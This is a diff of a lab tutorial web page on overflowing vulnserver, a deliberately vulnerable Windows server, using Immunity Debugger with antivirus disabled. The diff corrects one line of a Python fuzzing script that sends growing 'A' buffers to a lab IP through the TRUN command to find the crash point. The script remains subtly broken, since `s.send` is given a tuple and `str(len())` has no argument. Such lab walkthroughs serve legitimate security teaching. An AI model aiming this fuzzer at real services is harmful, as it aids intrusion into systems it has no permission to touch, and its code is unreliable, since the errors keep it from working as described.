@@ -108,7 +108,7 @@ For the purpose of this entry, the Windows machine runs vulnserver, a server tha
 The Windows machine also has Immunity Debugger downloaded.</br>
 Fortunately, Windows Defender and other antivirus solutions picks vulnserver.exe up and they block it.</br>
 Let's assume that Windows Defender and other antivirus solutions are turned off on the Windows machine.</br>
-First things first, we start vulnserver.exe application with administrative privileges.</br>
+First things first, we start the vulnserver.exe application with administrative privileges.</br>
 We do the same with Immunity Debugger.</br>
 In Immunity Debugger, we click File --> Attach and search for the vulnserver process.</br>
 We click on the vulnserver process and click on the Attach button.</br>
@@ -168,7 +168,7 @@ Let's make and execute the script now!</br>
 <span><span># gedit 1.py</span>
 </code></div>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;">
-<span><span>#!/usr/bin/python</br>import sys, socket</br>from time import sleep</br></br>buffer = "A" * 100</br></br>while True:</br>    try:</br>        s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)</br>        s = connect(('192.168.1.90', 9999))</br>        s.send(('TRUN /.:/' + buffer, 9999))</br>        s.close()</br>        sleep(1)</br>        buffer = buffer + "A" * 100</br>    except:</br>        print("Fuzzing crashed at %s bytes" % str(len()))</br>        sys.exit()</span>
+<span><span>#!/usr/bin/python</br>import sys, socket</br>from time import sleep</br></br>buffer = "A" * 100</br></br>while True:</br>    try:</br>        s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)</br>        s.connect(('192.168.1.90', 9999))</br>        s.send(('TRUN /.:/' + buffer, 9999))</br>        s.close()</br>        sleep(1)</br>        buffer = buffer + "A" * 100</br>    except:</br>        print("Fuzzing crashed at %s bytes" % str(len()))</br>        sys.exit()</span>
 </code></div>
 Remember the /.:/ part as the EAX register's value? We put it after the TRUN command so the application understands the remaining input.</br>
 Let's execute the script, wait for a little and cancel the execution if it doesn't stop without cancelling!
